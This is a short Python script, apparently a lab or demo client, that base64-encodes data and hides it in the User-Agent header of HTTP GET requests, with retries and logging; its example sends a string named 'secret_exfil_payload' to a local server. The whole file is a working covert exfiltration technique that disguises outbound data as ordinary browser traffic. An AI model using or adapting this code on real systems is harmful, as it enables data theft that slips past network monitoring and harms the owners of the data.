# client.py
import requests
import base64
from datetime import datetime
from time import sleep

def send_hidden_data(data, target_url, retries=3):
    encoded = base64.b64encode(data.encode()).decode()
    headers = {
        'User-Agent': f'Mozilla/5.0 (Steg-{encoded})'
    }
    
    attempt = 1
    while attempt <= retries:
        try:
            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            response = requests.get(target_url, headers=headers)
            end_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            print(f"[{start_time}] Sent: {data}")
            print(f"[{end_time}] Server replied: {response.status_code}")
            print(f"Server's Response Body: {response.text}")  # Display what the server returned

            if response.status_code == 200:
                print(f"[+] Successfully sent the data: {data}")
                break
            else:
                print(f"[{attempt}] Attempt failed: {response.status_code}. Retrying...")
                
        except Exception as e:
            print(f"[{attempt}] Error: {e}. Retrying...")
        
        sleep(2)  # Wait 2 seconds before retrying
        attempt += 1

# Example usage
if __name__ == "__main__":
    send_hidden_data("secret_exfil_payload", "http://127.0.0.1:5000")
